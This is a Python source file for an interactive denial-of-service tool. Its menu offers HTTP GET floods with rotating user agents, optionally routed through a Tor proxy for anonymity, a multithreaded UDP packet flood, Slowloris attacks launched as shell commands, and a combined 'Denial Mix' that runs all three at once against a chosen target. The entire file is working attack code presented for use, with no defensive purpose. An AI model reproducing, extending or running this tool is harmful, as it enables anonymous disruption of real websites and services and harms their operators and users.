import threading
import requests # type: ignore
import os
import sys
from pystyle import Colorate, Colors # type: ignore
import random
import socket
import subprocess

banner = """
  .=====================.
  |  GATEWAY2000 /P5-90/|
  |.-------------------.|
  ||[ _ o     . .  _ ]_||
  |`-------------------'|
  ||                   ||
  |`-------------------'|
  ||                   ||
  |`-------------------'|
  ||                   ||
  |`-----------------_-'|
  ||[=========]| o  (@) |
  |`---------=='/u/ --- |
  |------_--------------|
  | (/) (_)           []|
  |---==--==----------==|
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||||||||
  |||||||||||||||||dxm|||
  |||||||||||||||||||||||
  |=====================|
    Created by => 74lg0
"""


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def ip_server():
    try:
        proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
        response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=10)
        ip = response.json().get('origin')
        return ip
    except Exception:
        return 'Error server tor'

def make_request(url, user_agent, option):
    try:
        if option == 1:
            headers = {'User-Agent': user_agent}
            response = requests.get(url, headers=headers, timeout=1)
            print(f"Response Code: {response.status_code}")
        elif option == 2:
            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
            headers = {'User-Agent': user_agent}
            response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
            print(f'Response Code: {response.status_code}')
        
        elif option == 6:
            headers = {'User-Agent': user_agent}
            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
            response = requests.get(url, headers=headers, proxies=proxies, timeout=1)

    except requests.exceptions.RequestException as e:
        print(Colorate.Horizontal(Colors.green_to_blue, f"Failed to make request to {url}: {str(e)}"))
        sys.exit()

def send_packets(ip, port, t_count):
    bytes_to_send = random._urandom(1500)
    threads = []

    def send():
        pack = 0
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            pack = pack + 1
            print(f'Paquete {pack} enviado con exito...')
            s.sendto(bytes_to_send, (ip, port))

    for i in range(t_count):
        thread = threading.Thread(target=send)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def udp_mix(ip, port, t_count):
    bytes_to_send = random._urandom(1500)
    threads = []

    def send():
        pack = 0
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            pack = pack + 1
            s.sendto(bytes_to_send, (ip, port))

    for i in range(t_count):
        thread = threading.Thread(target=send)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main(url, option):
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:109.0) Gecko/20100101 Firefox/112.0  uacq',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.189 Safari/537.36 Vivaldi/1.95.1077.55',
        'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4346.13; Windows NT 6.2; WOW64; Trident/7.0; LCJB)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.6 Safari/525.19',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36  uacq',
        'Mozilla/5.0 (X11; CrOS aarch64 15329.44.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5765.224 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 OPR/80.0.4170.16',
        'Mozilla/5.0 (Linux; Android 12; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36  uacq'
    ]

    threads = []
    for ua in user_agents:
        thread = threading.Thread(target=make_request, args=(url, ua, option))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == '__main__':
    clear_console()
    print(Colorate.Horizontal(Colors.red_to_blue, banner))
    IP_public_server = ip_server()
    print(Colorate.Horizontal(Colors.rainbow, f'Tor Server IP => {IP_public_server}'))    
    print(Colorate.Horizontal(Colors.green_to_yellow, '\n[1] Normal Attack\n[2] Anonymous TOR Attack\n[3] UDP Sock Attack\n[4] Slowloris Attack\n[5] Slowloris TOR\n[6] Denial Mix'))

    try:
        option = int(input(Colorate.Horizontal(Colors.green_to_yellow, '=> ')))

        if option == 1 or option == 2:
            url = input(Colorate.Horizontal(Colors.green_to_yellow, 'URL => '))
            # Validación de la URL
            if not url.startswith(('https://', 'http://')):
                url = 'http://' + url
            while True:
                main(url, option)

        elif option == 3:
            ip = input("IP (domain) => ")
            port = int(input("Port => "))
            t_count = int(input('Number of threads => '))
            send_packets(ip, port, t_count)
        
        elif option == 4:
            ip = input('IP (Domain) => ')
            p = int(input('Port to Attack (Default 80) => '))
            sc = int(input('Sockets Count => '))
            os.system(f'python3 slowloris.py {ip} -p {p} -s {sc}')

        elif option == 5:
            ip = input('IP (Domain) => ')
            p = int(input('Port to Attack => '))
            sc = int(input('Socket Count => '))
            os.system(f'python3 slowloris.py --proxy-host 127.0.0.1 --proxy-port 9150 {ip} -p {p} -s {sc}')
        
        elif option == 6:
            ip = input('IP => ')
            dm = input('Domain (ej. www.google.com) => ')
            p = int(input('Port => '))
            sc = int(input('Socket Count (Slowloris) => '))
            t_count = int(input('Number of threads => '))

            print('Slowloris Attack...')
            slowloris_thread = threading.Thread(target=subprocess.run, args=(['python3', 'slowloris.py --proxy-host 127.0.0.1 --proxy-port 9150 ', ip, '-p', str(p), '-s', str(sc)],))
            slowloris_thread.start()

            print('HTTP-Flood Method...')
            http_thread = threading.Thread(target=main, args=(dm, option))
            http_thread.start()

            print('UDP Method...')
            udp_thread = threading.Thread(target=udp_mix, args=(ip, p, t_count))
            udp_thread.start()

            print('DoS Active...')
            slowloris_thread.join()
            http_thread.join()
            udp_thread.join()

        else:
            print(Colorate.Horizontal(Colors.red_to_green, '!!Incorrect option!!'))

    except KeyboardInterrupt:
        sys.exit()

    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f'!ERROR {str(e)}!'))
        sys.exit()
